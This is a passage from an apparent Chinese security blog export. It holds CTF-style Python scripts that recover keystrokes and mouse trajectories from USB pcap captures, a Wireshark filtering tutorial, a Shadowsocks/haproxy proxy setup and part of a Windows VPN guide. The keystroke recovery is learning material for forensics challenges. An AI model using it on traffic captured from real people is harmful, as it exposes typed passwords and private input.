class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>, <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">'[unknown]'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'output :\n'</span> + output</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 .\keyboard.py</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-鼠标流量"><a href="#2-鼠标流量" class="headerlink" title="2. 鼠标流量"></a>2. 鼠标流量</h3><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节。</p><p>其中第一个字节代表按键，当取0×00时，代表没有按键、为0×01时，代表按左键，为0×02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。</p><ol><li><p>使用kali linux中的<code>tshark</code> 命令把<code>cap data</code>提取出来，并去除空行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt &amp;&amp; sed -i &quot;/^$/d&quot; usbdata.txt</span><br></pre></td></tr></table></figure></li><li><p>根据usb协议鼠标数据还原鼠标移动轨迹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python mouse.py &gt; &apos;xy.txt&apos;</span><br><span class="line">gnuplot</span><br><span class="line">plot &quot;xy.txt&quot;</span><br></pre></td></tr></table></figure><p>或者另一个脚本直接运行出结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python UsbMiceDataHacker.py usb2.pcap RIGHT</span><br></pre></td></tr></table></figure><p>mouse.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nums = [] </span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>,<span class="string">'r'</span>) </span><br><span class="line">posx = <span class="number">0</span> </span><br><span class="line">posy = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys: </span><br><span class="line"><span class="keyword">if</span> len(line) != <span class="number">12</span> : </span><br><span class="line"><span class="keyword">continue</span> </span><br><span class="line">x = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>) </span><br><span class="line">y = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>) </span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> : </span><br><span class="line">x -= <span class="number">256</span> </span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> : </span><br><span class="line">y -= <span class="number">256</span> </span><br><span class="line">posx += x </span><br><span class="line">posy += y </span><br><span class="line">btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line"><span class="keyword">if</span> btn_flag == <span class="number">1</span> : </span><br><span class="line"><span class="keyword">print</span> posx,posy </span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure><p>UsbMiceDataHacker.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">mousePositionX = <span class="number">0</span></span><br><span class="line">mousePositionY = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">X = []</span><br><span class="line">Y = []</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">"usb.dat"</span></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> mousePositionX</span><br><span class="line">    <span class="keyword">global</span> mousePositionY</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        python UsbMiceHacker.py data.pcap [LEFT|RIGHT|MOVE|ALL]"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Tips : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        To use this python script , you must install the numpy,matplotlib first."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        You can use `sudo pip install matplotlib numpy` to install it"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Author : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        WangYihang &lt;wangyihanger@gmail.com&gt;"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        If you have any questions , please contact me by email."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        Thank you for using."</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    action = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> action != <span class="string">"LEFT"</span> <span class="keyword">and</span> action != <span class="string">"ALL"</span> <span class="keyword">and</span> action != <span class="string">"RIGHT"</span> <span class="keyword">and</span> action != <span class="string">"MOVE"</span>:</span><br><span class="line">        action = <span class="string">"LEFT"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    command = <span class="string">"tshark -r '%s' -T fields -e usb.capdata &gt; %s"</span> % (</span><br><span class="line">        pcapFilePath, DataFileName)</span><br><span class="line">    <span class="keyword">print</span> command</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> open(DataFileName, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            data.append(line[<span class="number">0</span>:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># handle move</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        Bytes = i.split(<span class="string">":"</span>)</span><br><span class="line">        <span class="keyword">if</span> len(Bytes) == <span class="number">8</span>:</span><br><span class="line">            horizontal = <span class="number">2</span>  <span class="comment"># -</span></span><br><span class="line">            vertical = <span class="number">4</span>  <span class="comment"># |</span></span><br><span class="line">        <span class="keyword">elif</span> len(Bytes) == <span class="number">4</span>:</span><br><span class="line">            horizontal = <span class="number">1</span>  <span class="comment"># -</span></span><br><span class="line">            vertical = <span class="number">2</span>  <span class="comment"># |</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        offsetX = int(Bytes[horizontal], <span class="number">16</span>)</span><br><span class="line">        offsetY = int(Bytes[vertical], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> offsetX &gt; <span class="number">127</span>:</span><br><span class="line">            offsetX -= <span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span> offsetY &gt; <span class="number">127</span>:</span><br><span class="line">            offsetY -= <span class="number">256</span></span><br><span class="line">        mousePositionX += offsetX</span><br><span class="line">        mousePositionY += offsetY</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">"01"</span>:</span><br><span class="line">            <span class="comment"># print "[+] Left butten."</span></span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">"LEFT"</span>:</span><br><span class="line">                <span class="comment"># draw point to the image panel</span></span><br><span class="line">                X.append(mousePositionX)</span><br><span class="line">                Y.append(-mousePositionY)</span><br><span class="line">        <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"02"</span>:</span><br><span class="line">            <span class="comment"># print "[+] Right Butten."</span></span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">"RIGHT"</span>:</span><br><span class="line">                <span class="comment"># draw point to the image panel</span></span><br><span class="line">                X.append(mousePositionX)</span><br><span class="line">                Y.append(-mousePositionY)</span><br><span class="line">        <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"00"</span>:</span><br><span class="line">            <span class="comment"># print "[+] Move."</span></span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">"MOVE"</span>:</span><br><span class="line">                <span class="comment"># draw point to the image panel</span></span><br><span class="line">                X.append(mousePositionX)</span><br><span class="line">                Y.append(-mousePositionY)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print "[-] Known operate."</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">"ALL"</span>:</span><br><span class="line">            <span class="comment"># draw point to the image panel</span></span><br><span class="line">            X.append(mousePositionX)</span><br><span class="line">            Y.append(-mousePositionY)</span><br><span class="line"></span><br><span class="line">    fig = plt.figure()</span><br><span class="line">    ax1 = fig.add_subplot(<span class="number">111</span>)</span><br><span class="line"></span><br><span class="line">    ax1.set_title(<span class="string">'[%s]-[%s] Author : WangYihang'</span> % (pcapFilePath, action))</span><br><span class="line">    ax1.scatter(X, Y, c=<span class="string">'r'</span>, marker=<span class="string">'o'</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean temp data</span></span><br><span class="line">    os.system(<span class="string">"rm ./%s"</span> % (DataFileName))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li></ol><p>参考：</p><p>《CTF流量分析之题型深度解析》，<a href="https://www.freebuf.com/column/201830.html" target="_blank" rel="noopener">https://www.freebuf.com/column/201830.html</a></p><p>《记一道USB流量分析CTF题》，<a href="https://blog.csdn.net/qq_36609913/article/details/78578406" target="_blank" rel="noopener">https://blog.csdn.net/qq_36609913/article/details/78578406</a></p>]]></content>
      
      
      <categories>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark流量分析(介绍)</title>
      <link href="/2019/02/15/Wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90(%E4%BB%8B%E7%BB%8D)/"/>
      <url>/2019/02/15/Wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90(%E4%BB%8B%E7%BB%8D)/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网卡模式"><a href="#一、网卡模式" class="headerlink" title="一、网卡模式"></a>一、网卡模式</h2><h3 id="标准模式"><a href="#标准模式" class="headerlink" title="标准模式"></a>标准模式</h3><p>网卡只接收目标地址是自己的数据包。</p><h3 id="混杂模式"><a href="#混杂模式" class="headerlink" title="混杂模式"></a>混杂模式</h3><p>只要数据包经过网卡，网卡就会接受该包，不管其目的地址是否为自己。</p><p><strong>混杂模式设置：</strong></p><p>网络与共享中心–&gt;本地连接–&gt;属性–&gt;配置–&gt;高级–&gt;网速与全双工–&gt;auto（自动匹配）</p> <a id="more"></a><h2 id="二、使用wireshark分析HTTP数据包"><a href="#二、使用wireshark分析HTTP数据包" class="headerlink" title="二、使用wireshark分析HTTP数据包"></a>二、使用wireshark分析HTTP数据包</h2><h3 id="封包详细信息"><a href="#封包详细信息" class="headerlink" title="封包详细信息"></a>封包详细信息</h3><ul><li>Frame 数据帧情况 –&gt;物理层<ul><li>接口id</li><li>封装类型</li><li>捕获时间</li><li>时间戳</li><li>帧序列号</li><li>帧长度</li><li>捕获长度</li></ul></li><li>Ethernet Ⅱ 数据链路层 以太网帧头部信息<ul><li>目标mac</li><li>源mac</li><li>IP类型（跟下一层有关）</li></ul></li><li><p>IPv4：网络层</p><ul><li>版本</li><li>头部长度</li><li>差分服务字段</li><li>总长度</li><li>标志字段</li><li>标记字段</li><li>TTL</li><li><p>上层协议</p></li><li><p>头部数据的校验和</p></li><li>源IP</li><li>目的IP</li></ul></li><li><p>Transmission Control Protocol    传输层</p><ul><li>源端口</li><li>目的端口</li><li>序列号</li><li>下一个序列号</li><li>确认号</li><li>头部长度</li><li>标记</li><li>窗口大小</li><li>校验和</li><li>urgent_pointer紧急指针</li></ul></li><li><p>Hypertext Transfer Protocol    </p><p>接下来跟浏览器抓包的内容大致相同，这里就省略了。</p></li></ul><h2 id="三、基本功能"><a href="#三、基本功能" class="headerlink" title="三、基本功能"></a>三、基本功能</h2><h3 id="数据包筛选"><a href="#数据包筛选" class="headerlink" title="数据包筛选"></a>数据包筛选</h3><p>协议筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcp  筛选协议为tcp的流量包</span><br><span class="line">udp 筛选协议为udp的流量包</span><br><span class="line">arp/icmp/http/ftp/dns/ip  筛选协议为arp/icmp/http/ftp/dns/ip的流量包</span><br></pre></td></tr></table></figure><p>mac地址筛选:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eth.dst ==A0:00:00:04:C5:84 筛选目标mac地址</span><br><span class="line">eth.addr==A0:00:00:04:C5:84 筛选MAC地址</span><br></pre></td></tr></table></figure><p>IP筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.1.1 找源是192.168.1.1的记录</span><br><span class="line">#或者右键IPv4下的Source字段，作为过滤器应用-选中</span><br><span class="line">ip.dst == 192.168.1.2 找目的IP是192.168.1.2的记录</span><br><span class="line">#或者右键IPv4下的Destination字段，作为过滤器应用-选中</span><br><span class="line">ip.addr == 192.168.1.1 找记录中含有192.168.1.1的（不分源和目的）</span><br></pre></td></tr></table></figure><p>端口筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcp.port == 80   端口是80的记录</span><br><span class="line">tcp.dstport == 80  筛选tcp协议的目标端口为80 的流量包</span><br><span class="line">tcp.srcport == 80  筛选tcp协议的源端口为80 的流量包</span><br><span class="line">udp.srcport == 80  筛选udp协议的源端口为80 的流量包</span><br></pre></td></tr></table></figure><p>http请求筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">请求方法为GET：</span><br><span class="line">http.request.method==&quot;GET&quot;#筛选HTTP请求方法为GET的流量包</span><br><span class="line"></span><br><span class="line">请求方法为POST：</span><br><span class="line">http.request.method==&quot;POST&quot;#筛选HTTP请求方法为POST的流量包</span><br><span class="line"></span><br><span class="line">指定URI：</span><br><span class="line">http.request.uri==&quot;/img/logo-edu.gif&quot; #筛选HTTP请求的URL为/img/logo-edu.gif的流量包</span><br><span class="line"></span><br><span class="line">请求或相应中包含特定内容：</span><br><span class="line">http contains &quot;FLAG&quot;#筛选HTTP内容为/FLAG的流量包</span><br></pre></td></tr></table></figure><p>包长度筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">udp.length ==20筛选长度为20的udp流量包</span><br><span class="line">tcp.len &gt;=20筛选长度大于20的tcp流量包</span><br><span class="line">ip.len ==20 筛选长度为20的IP流量包</span><br><span class="line">frame.len ==20 筛选长度为20的整个流量包</span><br></pre></td></tr></table></figure><p>连接符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and&amp;</span><br><span class="line">or||</span><br></pre></td></tr></table></figure><h3 id="数据包搜索"><a href="#数据包搜索" class="headerlink" title="数据包搜索"></a>数据包搜索</h3><p>Ctrl + F，一般选择字符串方式搜索，左侧选择分组内容（列表、详情、字节流）。</p><h3 id="数据包还原"><a href="#数据包还原" class="headerlink" title="数据包还原"></a>数据包还原</h3><p>选中想要还原的流量包，右键选中，选择追踪流—TCP流/UDP流/SSL流/HTTP流。</p><h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><p>Wireshark支持提取通过http传输（上传/下载）的文件内容，方法如下：</p><p>选中http文件传输流量包，在分组详情中找到data或者Line-based text data:text/html层，鼠标右键点击 – 选中 导出分组字节流。</p><p>如果是菜刀下载文件的流量，需要删除分组字节流前开头和结尾的X@Y字符，否则下载的文件会出错。鼠标右键点击 – 选中 显示分组字节；在弹出的窗口中设置开始和结束的字节（原字节数开头加3，结尾减3），最后点击save as按钮导出。</p><p>参考：</p><p><a href="https://blog.csdn.net/daxueba/article/details/46911511" target="_blank" rel="noopener">Wireshark数据抓包教程之认识捕获分析数据包</a></p><p><a href="https://www.freebuf.com/column/199838.html" target="_blank" rel="noopener">CTF流量分析之wireshark使用</a></p>]]></content>
      
      
      <categories>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shadowsock快速部署</title>
      <link href="/2019/02/10/shadowsock%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2/"/>
      <url>/2019/02/10/shadowsock%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="shadowsock快速部署"><a href="#shadowsock快速部署" class="headerlink" title="shadowsock快速部署"></a>shadowsock快速部署</h1><p>ss+kcptun加速</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -dt --name ssserver -p 60443:6443 -p 60500:6500/udp mritd/shadowsocks -m &quot;ss-server&quot; -s &quot;-s 0.0.0.0 -p 6443 -m chacha20-ietf-poly1305 -k xxxxxxxxxxx&quot; -x -e &quot;kcpserver&quot; -k &quot;-t 127.0.0.1:6443 -l :6500 --key &quot;xxxxxxxxxxxx&quot; -mode fast&quot;</span><br></pre></td></tr></table></figure><blockquote><p>注意：开启防火墙</p></blockquote><p>国内VPS中转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install haproxy</span><br><span class="line">vim /etc/haproxy/haproxy.cfg</span><br></pre></td></tr></table></figure><p>修改配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global</span><br><span class="line"></span><br><span class="line">defaults</span><br><span class="line">        log     global</span><br><span class="line">        mode    tcp</span><br><span class="line">        option  dontlognull</span><br><span class="line">        timeout connect 5000</span><br><span class="line">        timeout client  50000</span><br><span class="line">        timeout server  50000</span><br><span class="line"></span><br><span class="line">frontend ss-in</span><br><span class="line">    bind *:60443</span><br><span class="line">    default_backend ss-out</span><br><span class="line"></span><br><span class="line">backend ss-out</span><br><span class="line">    server server1 45.76.54.142 maxconn 20480</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start haproxy.service</span><br></pre></td></tr></table></figure><blockquote><p>注意：开启防火墙</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shadowsocks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建OpenVPN服务(Windows08R2)</title>
      <link href="/2019/02/07/%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1(Windows-2008-R2)/"/>
      <url>/2019/02/07/%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1(Windows-2008-R2)/</url>
      
        <content type="html"><![CDATA[<h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>​    虚拟私人网络（Virtual Private Network，缩写为VPN）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用隧道协议（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果，这种技术可以用不安全的网络（例如：互联网）来发送可靠、安全的消息。</p><pre><code>通常情况下，VPN网关采取双网卡结构，外网卡使用公网IP接入Internet。</code></pre> <a id="more"></a><h1 id="二、搭建步骤"><a href="#二、搭建步骤" class="headerlink" title="二、搭建步骤"></a>二、搭建步骤</h1><ol><li>安装VPN服务，打开服务器管理器-添加角色</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps1.jpg" alt="img"> </p><ol start="2"><li>点击添加角色，下一步，勾选网络策略和访问服务，下一步是网络策略访问的简介</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps2.jpg" alt="img"> </p><ol start="3"><li>勾选网络策略服务器，和路由访问，然后下一步，继续安装</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps3.jpg" alt="img"> </p><ol start="4"><li>安装完成</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps4.jpg" alt="img"> </p><ol start="5"><li>安装完成之后，在服务器管理器中找到路由和远程访问，并且进行配置</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps5.jpg" alt="img"> </p><ol start="6"><li>配置点击下一步，选择自定义配置</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps6.jpg" alt="img"> </p><ol start="7"><li>然后下一步勾选VPN访问，点击完成即可！</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps7.jpg" alt="img"> </p><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps8.jpg" alt="img"> </p><ol start="8"><li>完成之后需要启动路由和远程访问功能</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps9.jpg" alt="img"> </p><ol start="9"><li>安装完成之后，开始配置VPN，找到路由和远程访问，IPV4展开之后，出现常规，选中常规右键新增路由协议</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps10.jpg" alt="img"> </p><ol start="10"><li>在添加的路由协议中，选择NAT路由协议。</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps11.jpg" alt="img"> </p><ol start="11"><li>上步选择了NAT，现在配置NAT，在NAT上右键新增接口</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps12.jpg" alt="img"> </p><ol start="12"><li>然后把“内部”接口也添加上，并“右键”——”属性“如下设置：</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps13.jpg" alt="img"> 